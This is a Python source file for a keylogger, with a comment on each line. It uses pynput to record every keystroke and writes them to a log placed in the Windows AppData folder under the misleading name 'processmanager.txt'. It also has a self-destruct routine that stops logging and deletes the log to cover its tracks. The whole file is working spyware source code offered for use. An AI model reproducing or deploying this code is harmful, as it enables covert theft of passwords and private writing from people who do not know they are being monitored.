import os  # Import the os module for interacting with the operating system
from pynput.keyboard import Listener  # Import the Listener class from the pynput.keyboard module
import time  # Import the time module for time-related operations
import threading  # Import the threading module for concurrent execution

# Define a class named Keylogger
class Keylogger():
    keys = []  # List to store pressed keys
    count = 0  # Counter for key presses
    flag = 0  # Flag to control self-destruction
    path = os.environ['appdata'] +'\\processmanager.txt'  # Construct the path for the log file in the user's appdata directory

    # Function to be called when a key is pressed
    def on_press(self, key):
        self.keys.append(key)  # Add the pressed key to the keys list
        self.count += 1  # Increment the key press counter

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)  # Write the pressed keys to the log file
            self.keys = []  # Clear the keys list

    # Function to read and return the contents of the log file
    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    # Function to write the pressed keys to a log file
    def write_file(self, keys):
        with open(self.path, 'a') as f:  # Open the log file in append mode
            for key in keys:
                k = str(key).replace("'", "")  # Convert the key to a string and remove single quotes
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)  # Write the key to the log file

    # Function to perform self-destruction (stop keylogging and remove log file)
    def self_destruct(self):
        self.flag = 1  # Set the flag to indicate self-destruction
        listener.stop()  # Stop the listener
        os.remove(self.path)  # Remove the log file

    # Function to start the keylogging process
    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()  # Start listening for key presses

# Main execution block
if __name__ == '__main__':
    keylog = Keylogger()  # Create an instance of the Keylogger class
    t = threading.Thread(target=keylog.start)  # Create a thread to start the keylogging process
    t.start()  # Start the thread
    while keylog.flag != 1:  # Loop until the self-destruction flag is set
        time.sleep(10)  # Wait for 10 seconds
        logs = keylog.read_logs()  # Read the contents of the log file
        print(logs)  # Print the logged keystrokes
        # keylog.self_destruct()  # Uncomment this line to enable self-destruction
    t.join()  # Wait for the thread to finish
